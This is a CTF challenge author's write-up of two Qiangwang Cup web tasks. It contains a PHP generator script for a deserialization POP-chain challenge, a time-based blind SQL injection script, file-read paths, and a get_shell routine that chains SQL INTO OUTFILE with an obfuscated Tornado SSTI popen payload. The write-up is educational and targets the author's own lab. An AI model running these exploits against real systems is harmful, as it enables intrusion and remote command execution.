# 强网杯[pop_master]与[陀那多]赛题的出题记录

阅读量 **272540**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-15 15:00:53

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

本菜鸡是强网杯[pop_master]与[陀那多]赛题的出题人，由于毕业答辩就在竞赛前一天，可能赛题准备有点仓促，出现了一些预料之外的问题，在这里给各位选手道个歉。

以下为两道赛题的出题思路与预期解。

## pop_master

本赛题被解成了签到题，其中有非预期，也有作弊的情况，组委会一定严查wp，尽全力确保竞赛的公平公正。

本题提供了`10000`个类，需要选手从中找出可用的`pop`链，这个代码分析量是非常大的，`pop`链长度有`20`多层，几乎不可能人工机完成代码审计，所以本题的出题主旨其实是希望选手关注自动化代码审计技术这一部分知识。PHP的自动化代码审计其实是一个非常有意思的主题，我开始关注这一部分技术是因为试用了腾讯的`Xcheck`工具，这工具非常厉害，能够自动审计各种复杂的cms，并生成漏洞报告，大大提高了漏洞挖掘的效率，根据`Xcheck`的公众号，该工具采用的自动化代码审计技术为抽象语法树+污点分析。

本题的预期解题思路为将PHP代码转换为抽象语法树，再基于抽象语法树构建调用关系图与控制流程图，最后基于这两个图做污点分析。但是我看几乎大部分解法都是爆破二叉树或者利用正则来做，还是我的混淆语句太单一了，但是如果遇到更复杂的场景，还是污点分析效果更好。以下为解题思路中的基础知识介绍。

###  抽象语法树

为什么要将PHP代码转换为抽象语法树呢？因为我们要想实现PHP代码的自动化审计，就需要将PHP代码这种非格式化的字符串，转换为格式化的数据结构，这样才能去分析PHP代码的语义，进而实现漏洞挖掘。除了抽象语法树之外，还有token流等中间代码表示，但是目前主流的都是用抽象语法树这种数据结构了。

什么是抽象语法树呢？抽象语法树（abstract syntax
code，AST）是一种数据结构，是程序编译阶段的一种中间表示形式。作为一种良好的中间表示，AST能够比较直观地表示出源程序的语法结构，含有源程序结构显示所需的全部静态信息，并具有较高的存储效率。下图为抽象语法树的图示：

![](https://p3.ssl.qhimg.com/t012403efb6e789f6af.png)

更详细的来看，抽象语法树长这样：

![](https://p2.ssl.qhimg.com/t01171c9f9fc887fabc.png)

我们如何构建抽象语法树呢？可以使用`php-parser`工具，我注意到有许多选手已经用上了这个工具，这个工具可以帮助我们从PHP代码构建出抽象语法树，并帮助我们对抽象语法树进行各种各样的操作。后续的`exp`我都是基于这个工具做的。

###  构建调用关系图与控制流程图

调用关系图就是指各个函数与类之间的调用关系构成的图，控制流程图将代码根据`if`等跳转语句分割成块，然后这些块之间构成的关系图。调用关系图是将PHP代码进行宏观分割，分割成各个函数与类，然后根据调用关系将这些函数与类连接起来。而控制流程图是微观的图，他是将函数的定义语句分割成代码块，然后根据跳转关系将各个代码块连接起来。用图来表示就是下图所示（左边是调用关系图，右边是调用关系图中某个函数的控制流程图）：

![](https://p2.ssl.qhimg.com/t0163a72374535ee03a.png)

调用关系图的构建非常简单，控制流程图的话稍微复杂一点，就是遍历抽象语法树，当遇到`IF`等各类跳转节点就新建一个代码块，然后找到对应的代码块跳转关系即可。

###  污点分析

污点分析是数据流分析的一种特例，简单解释就是将用户的输入变量标记成污点，比如`$_GET[xxx]`，然后通过遍历调用关系图与控制流程图，对PHP代码的语义进行分析。比如`$a`被污点赋值了，那么`$a`也就成了一个污点，这个过程叫做污点传播。而如果遇到安全处理函数，比如说`addslashes`函数，那么这个变量就不再是污点了，这个过程称之为消毒。当遍历到敏感函数，比如说`eval`函数时，查看该函数的参数是否为污点，如果是污点的话，则标记为找到漏洞。这就是污点分析的主要过程，基本图示如下：

![](https://p3.ssl.qhimg.com/t01ca835ced26faece3.png)

如上图所示，污点分析中，主要的三元素为污染源(`Source`)，敏感点（`Sink`），安全处理部分。

综上所述，我们进行自动化代码审计的主要逻辑如下：

![](https://p0.ssl.qhimg.com/t010be274ba8771f90e.png)

回到本题，笔者构建了一万个类，然后给了一个反序列化的接口，并且调用了反序列化得到的类中的方法，希望选手从一万个类中找到可以命令执行的pop链。那么基于上述思路，我们将PHP代码转换成抽象语法树，然后构建控制流程图与调用关系图，最后遍历控制流程图与调用关系图做污点分析即可。需要注意的是，调用关系图中，我们需要找到从入口方法（也就是index.php中我们调用的那个方法）到敏感方法（带有eval函数的方法）的调用链来进行遍历，而不是随便遍历。

最终exp我放码云上了，这个exp是我拿自己写的一个自动代码审计的小工具改的，可能会有一些冗余的代码，请见谅。（[https://gitee.com/b1ind/pop_master）](https://gitee.com/b1ind/pop_master%EF%BC%89)

以下为生成题目环境的脚本（临时写的脚本，代码不规范，请轻喷）

    
    
    import random
    import sys
    import re
    import os
    
    sys.setrecursionlimit(1000000)
    
    def get_random_str(randomlength=16):
        random_str = ''
        base_str1 = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz'
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        length1 = len(base_str1) - 1
        length = len(base_str) - 1
        random_str = base_str1[random.randint(0, length1)]
        for i in range(randomlength-1):
            random_str += base_str[random.randint(0, length)]
        return random_str
    
    def nothing_stmts(arg):
        stmts = [
            "\t\t$this->" + get_random_str(5) + ' = "' +get_random_str(5) + "\";\n",
            "\t\tif(" + str(random.randint(0,65535)) + ">" + str(random.randint(0,65535)) + "){\n\t\t\t$" + arg + " = $" + arg + ".'" + get_random_str(5) +"';\n\t\t}\n",
            "\t\tfor($i = 0; $i < " +str(random.randint(0,40))+ "; $i ++){\n\t\t\t$a" + get_random_str(5) + "= $" + arg + ";\n\t\t}\n"
        ]
        return random.choice(stmts)
    
    def clean_stmts(arg):
        #print(arg)
        stmts = [
            "\t\tfor($i = 0; $i < " +str(random.randint(0,40))+ "; $i ++){\n\t\t\t$" + arg + "= $" + get_random_str(5) + ";\n\t\t}\n",
            "\t\t$" + arg + "='" + get_random_str(5) + "';\n"
        ]
        return random.choice(stmts)
    
    
    class_list = set()
    method_list = dict()
    class_method = dict()
    
    i = 0
    while 1:
        if len(class_list) >= 10000 and len(method_list) >= 20000:
            break
        class_name = get_random_str(6)
        class_list.add(class_name)
        method_1 = get_random_str(6)
        method_2 = get_random_str(6)
        method_list[method_1] = class_name
        method_list[method_2] = class_name
        class_method[class_name] = [method_1, method_2]
    
    func_map = dict()
    method_list_keys = list(method_list.keys())
    
    array = []
    array2 = []
    
    key = random.sample(method_list_keys, 1)[0]
    method_list_keys.remove(key)
    array.append(key)
    start_func = key
    
    
    for i in range(9990):
        func = array.pop(0)
        key1 = random.sample(method_list_keys, 1)[0]
        method_list_keys.remove(key1)
        if random.randint(0,1):
            key2 = random.sample(method_list_keys, 1)[0]
            method_list_keys.remove(key2)
            func_map[func] = [key1,key2]
            array.append(key1)
            array.append(key2)
        else:
            func_map[func] = [key1]
            array.append(key1)
    
    
    muban = """
    class {class_name}{{
        public ${var_name};
        public function {func_name1}(${random1}){{
    {func_name1}_other{func_name1_call1}{func_name1_call2}
        }}
        public function {func_name2}(${random2}){{
    {func_name2}_other{func_name2_call1}{func_name2_call2}
        }}
    }}
    """
    
    strs = dict()
    method_args = dict()
    class_var = dict()
    
    for i in class_method.keys():
        methods = class_method[i]
        class_name = i
        var_name = get_random_str(7)
        class_var[class_name] = var_name
        random1 = get_random_str(5)
        random2 = get_random_str(5)
        func_name1 = methods[0]
        func_name2 = methods[1]
        temp_flag = 0  #用来临时标记，删除_other语句使用
        if not func_map.get(func_name1):
            func_name1_call1 = "\t\teval($" + random1 + ");\n"
            func_name1_call2 = ""
            temp_flag += 1
        elif len(func_map.get(func_name1)) == 1:
            func_name1_call1 = "\t\t$this->" + var_name + "->" + func_map[func_name1][0] + "($" + random1 +");\n"
            func_name1_call2 = ""
        elif len(func_map.get(func_name1)) == 2:
            func_name1_call1 = "\t\tif(method_exists($this->" + var_name + ", '" + func_map[func_name1][0] + "')) $this->" + var_name + "->" + func_map[func_name1][0] + "($" + random1 +");\n"
            func_name1_call2 = "\t\tif(method_exists($this->" + var_name + ", '" + func_map[func_name1][1] + "')) $this->" + var_name + "->" + func_map[func_name1][1] + "($" + random1 +");\n"
        else:
            func_name1_call1 = "\t\teval($" + random1 + ");\n"
            func_name1_call2 = ""
            temp_flag += 1
    
        if not func_map.get(func_name2):
            func_name2_call1 = "\t\teval($" + random2 + ");\n"
            func_name2_call2 = ""
            temp_flag += 2
        elif len(func_map.get(func_name2)) == 1:
            func_name2_call1 = "\t\t$this->" + var_name + "->" + func_map[func_name2][0] + "($" + random2 +");\n"
            func_name2_call2 = ""
        elif len(func_map.get(func_name2)) == 2:
            func_name2_call1 = "\t\tif(method_exists($this->" + var_name + ", '" + func_map[func_name2][0] + "')) $this->" + var_name + "->" + func_map[func_name2][0] + "($" + random2 +");\n"
            func_name2_call2 = "\t\tif(method_exists($this->" + var_name + ", '" + func_map[func_name2][1] + "')) $this->" + var_name + "->" + func_map[func_name2][1] + "($" + random2 +");\n"
        else:
            func_name1_call1 = "\t\teval($" + random1 + ");\n"
            func_name1_call2 = ""
            temp_flag += 2
    
        muban2 = muban.format(class_name=class_name, var_name=var_name, random1=random1, random2=random2, func_name1=func_name1, func_name2=func_name2, func_name1_call1=func_name1_call1, func_name1_call2=func_name1_call2, func_name2_call1=func_name2_call1, func_name2_call2=func_name2_call2)
        """
        if temp_flag == 1:
            muban2 = muban2.replace(func_name1 + "_other", "")
        elif temp_flag == 2:
            muban2 = muban2.replace(func_name2 + "_other", "")
        elif temp_flag == 3:
            muban2 = muban2.replace(func_name1 + "_other", "").replace(func_name2 + "_other", "")
        """
        strs[class_name] = muban2
        method_args[func_name1] = random1
        method_args[func_name2] = random2
    
    flag = 0
    flag2 = 0 #用来留后门
    flag3 = 0
    i = 0
    result_list = []
    result_list2 = []
    
    def dfs(method):
        global func_map, flag, strs, method_list, flag2, flag3, i, result_list, result_list2
        i += 1
        result_list.append(method)
        class_name = method_list[method]
        if i >= 1000 and flag3 == 0 and flag == 0:
            flag2 = 1
            flag3 = 1
        if not func_map.get(method):
            if flag2 == 1:
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                result_list2 = result_list.copy()
                flag2 = 0
            elif flag == 0:
                strs[class_name] = strs[class_name].replace(method + "_other", clean_stmts(method_args[method]))
            else :
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
            #print(i)
            result_list.pop()
            return
        if len(func_map[method]) == 1:
            if flag2 == 1:
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                dfs(func_map[method][0])
            elif flag == 1:
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                dfs(func_map[method][0])
            else:
                if random.randint(0, 15) == 14 and i > 40:
                    flag = 1
                    strs[class_name] = strs[class_name].replace(method + "_other", clean_stmts(method_args[method]))
                    dfs(func_map[method][0])
                    flag = 0
                else:
                    strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                    dfs(func_map[method][0])
    
        elif len(func_map[method]) == 2:
            if flag2 == 1:
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                dfs(func_map[method][0])
                dfs(func_map[method][1])
            elif flag == 1:
                strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                dfs(func_map[method][0])
                dfs(func_map[method][1])
            else:
                if random.randint(0, 15) == 14  and i > 40:
                    flag = 1
                    strs[class_name] = strs[class_name].replace(method + "_other", clean_stmts(method_args[method]))
                    dfs(func_map[method][0])
                    dfs(func_map[method][1])
                    flag = 0
                else:
                    strs[class_name] = strs[class_name].replace(method + "_other", nothing_stmts(method_args[method]))
                    dfs(func_map[method][0])
                    dfs(func_map[method][1])
        result_list.pop()
    
    dfs(start_func)
    
    with open(r"/root/class.php" ,"w+") as f:
        f.write("<?php\n")
        for class_name in strs.keys():
            string = strs[class_name]
            if "_other" in string:
                string = re.sub(".{6}_other", "", string)
            f.write(string + "\n")
    
    
    pop = "*****"
    for func in result_list2:
        pop = pop.replace("*****", 'O:6:"' + method_list[func] + '":1:{s:7:"' + class_var[method_list[func]] + '";*****}')
    pop = pop.replace("*****", "N;")
    
    index_muban = """
    <?php
    include "class.php";
    //class.php.txt
    highlight_file(__FILE__);
    $a = $_GET['pop'];
    $b = $_GET['argv'];
    $class = unserialize($a);
    $class->{start_func}($b);
    """
    index_content = index_muban.format(start_func=start_func)
    
    with open(r"/root/index.php" ,"w+") as f:
        f.write(index_content)
    
    with open("/root/pop", "w") as f:
        f.write(pop)
    

## 陀那多

这个题目只有两个队伍解出来了，可能和放题时间有关吧，其实题目挺简单的。本题主要考察的是SQL注入与tornado框架的SSTI利用，我印象中CTF竞赛里考察tornado的SSTI的题目只有2018年护网杯的easy_tornado赛题，而且该赛题还只考察了一个cookie_secret的获取，于是我研究了一下tornado的源码，探索了一下tornado的SSTI的利用的姿势。

####  tornado的SSTI利用

tornado框架的支持的SSTI标签有三种：

    
    
    {{xxx}}
    {%xxx%}
    {#xxx#}
    

其中`{##}`是注释用的，里面的语句不会被执行，而`{{}}`与`{%%}`则可以被用来执行命令。

首先是`{{}}`，这个标签可以说是非常危险，因为它里面可以执行任意的python函数，比如eval函数`{{eval("xxx")}}`。

![](https://p5.ssl.qhimg.com/t0187f0ae21bd5e5ef2.png)

那这就很危险了，毕竟各位师傅的Python命令执行黑魔法一大堆，通过黑名单进行字符过滤是阻挡不了被命令执行的。除了python中的内置函数可以被调用外，还有一些tornado自带的原生类也可以被用来命令执行，可以使用{{globals()}}来查看所有可用的全局变量，如下图所示。

![](https://p4.ssl.qhimg.com/t013ceda55d15e54a6f.png)

具体有哪些全局变量可以用，哪些变量可以被用来执行命令，各位大佬可以研究研究，我就不列举了。本题中`{{`符号是被过滤的，因此本题考点不在`{{}}`上。

`{%%}`是`tornado`的另一个标签，它里面的语句受到限制，格式为`{%操作名
参数%}`，操作名在`tornado`的源码中进行了规定，具体源码在`tornado`库中的`template.py`中，以下为从源码中总结出来的所有操作名。

    
    
    apply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace
    

具体操作的意义请自行阅读源码，本文不再赘述，唯独介绍一下`raw` 操作，该操作可以执行原生的python代码。

![](https://p0.ssl.qhimg.com/t012515caebdecf0941.png)

懂我意思吧.jpg，各种python黑魔法走起。（不过可惜，本题考点不在这里）

####  预期解题过程

#####  SQL注入进后台

本题第一个关为SQL注入，SQL注入点在注册处，可以直接单引号闭合，过滤也非常少，但是表名和列名难以获取，本题采用的考点为利用`processlist`表读取正在执行的sql语句，从而得到表名与列名。exp为如下：

    
    
    def sql_exp(url):
        payload = ""
        try:
            for i in range(1,60):
                for j in string:
                    payload1 = url+"/register.php?password=1&username=admin'%0dand%0dif(mid((select%0dInfo%0dfrom%0dinformation_schema.processlist%0dlimit%0d0,1)," + str(i) + ',1)%0din%0d(\'' + j + '\'),!sleep(3),1)%0dand%0d\'1'
                    payload2 = url+"/register.php?password=1&username=admin'%0dand%0dif(mid((select%0dqwbqwbqwbpass%0dfrom%0dqwbtttaaab111e%0dlimit%0d0,1)," + str(i) + ',1)%0din%0d(\'' + j + '\'),!sleep(3),1)%0dand%0d\'1'
                    time1 = time.time()
                    res = requests.get(payload1,headers=headers)
                    time2 = time.time()
                    if 'error' in res.text:
                        print(1)
                    #print(time2-time1)
                    #print(res.text)
                    intval1 = (time2 - time1)
                    if intval1 > 3:
                        payload += j
                        print(payload)
                        continue
        except Exception as e:
                return False
    
        return True
    

#####  任意文件读取+pyc恢复代码

任意文件读用的是老掉牙的`os.path.join`考点，原理不赘述了，看我偶像ph牛的博客吧（[https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html）](https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html%EF%BC%89)

这里过滤了.py结尾的文件名，在任意文件读取后，有几个关键文件是需要读到的。

1、/proc/self/cmdline 这个文件可以看到我们的python应用运行的文件夹

![](https://p0.ssl.qhimg.com/t0145c74ea2372539e5.png)

2、/proc/self/environ，这个文件可以让我们看到一些重要的属性，比如本WEB服务的权限为mysql用户权限。

![](https://p2.ssl.qhimg.com/t01cc43c52251cf33b2.png)

3、pyc文件，本来想让选手自己通过读取pyc文件，然后还原python代码的，但是为了减少选手不必要的工作量，我早早就放了hint，pyc文件是有一定的命名规则的，既然我们得知了app.py的目录，我们就可以去该目录寻找pyc文件。pyc的命名规则为`__pycache__/文件名.cpython-2位版本号.pyc`，这里文件名为app，版本号需要爆破一下，其实如果你留心的话，本服务器在http返回头中返回了tornado版本号（tornado默认返回的）为`Server:
TornadoServer/6.0.3`，而该版本的tornado只支持python3.5及其以上版本，因此这里只需要随便猜几次就猜到python版本号了。最终payload为：

`/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc`

4、pyc文件恢复源码，这个比较简单，就不赘述了，使用`uncompyle6`工具即可

#####  tornado的SSTI利用与SQL注入结合

得到源码后，发现SSTI过滤了很多东西，其中最致命的就是过滤了`{{}}`标签，那么我们可用的只有`{%%}`标签，而且`{%%}`中的危险操作名已经被我过滤得差不多了，而剩下的操作名中，有一个操作是比较危险的，那就是extends操作，它的参数为一个文件名，该文件将会被作为模板文件被包含，并被
**渲染**
。那么如果我们包含一个带有恶意SSTI的payload的字符串的文件，那么是可以执行该SSTI的payload的。因此我们现在需要往服务器上上传一个恶意文件。

如何往服务器上上传文件呢？根据前文信息，我们可以得知该python应用为mysql用户权限启动，那么我们可以直接考虑通过mysql的into
outfile语句写文件。这里分为两步，首先是往数据库里写东西，这个可以直接通过注册功能实现，第二步是将数据库里的数据导出至文件，在mysql中默认导出目录为`/var/lib/mysql-files/`，其他目录是没有导出权限的，因此我们将文件导出至该文件夹。

然后通过{%extends /var/lib/mysql-files/xxx%}来包含模板文件，从而执行任意ssti的payload，最终payload如下：

    
    
    def get_shell(url):
        file_name = random_str(6)
        register_payload = url+"/register.php?password=1&username=%7b%7b__import__(bytes.fromhex(str(hex(28531))[2:]).decode()).popen(bytes.fromhex(str(hex(159698592644438093083295786740770931105195540868394758120956263))[2:]).decode()).read()%7d%7d"
        requests.get(register_payload)
        upload_file_payload = url+"/register.php?password=1&username=1' or 1 into outfile '/var/lib/mysql-files/" + file_name
        requests.get(upload_file_payload)
        s = requests.session()
        s.get(url+"/login.php?username=admin&password=we111c000me_to_qwb")
        res = s.get(url+"/good_job_my_ctfer.php?congratulations={%25extends /var/lib/mysql-files/" + file_name + "%25}")
        print(res.text)
    

以上为两道强网杯赛题的出题思路与预期解法，对于pop_master赛题的出题失误，给各位师傅带来了不好的竞赛体验，在这里先抱歉了。强网杯过去一直以PWN手之间的较量为主导，我们今年大胆尝试加入大量WEB题，旨在为各位WEB选手带来更好的体验，但是目前来看效果一般，后续我们会继续努力，为各位选手营造更好的竞赛氛围，请大家相信强网杯。

最后也欢迎各位师傅来一起研究自动化代码审计以及tornado SSTI的各种姿势。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **b1ind** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/244153](/post/id/244153)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [强网杯](/tag/强网杯)

 **+1** __17赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=xTLzFZk25pq7gLOHYIkzOA&s=40) b1ind

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

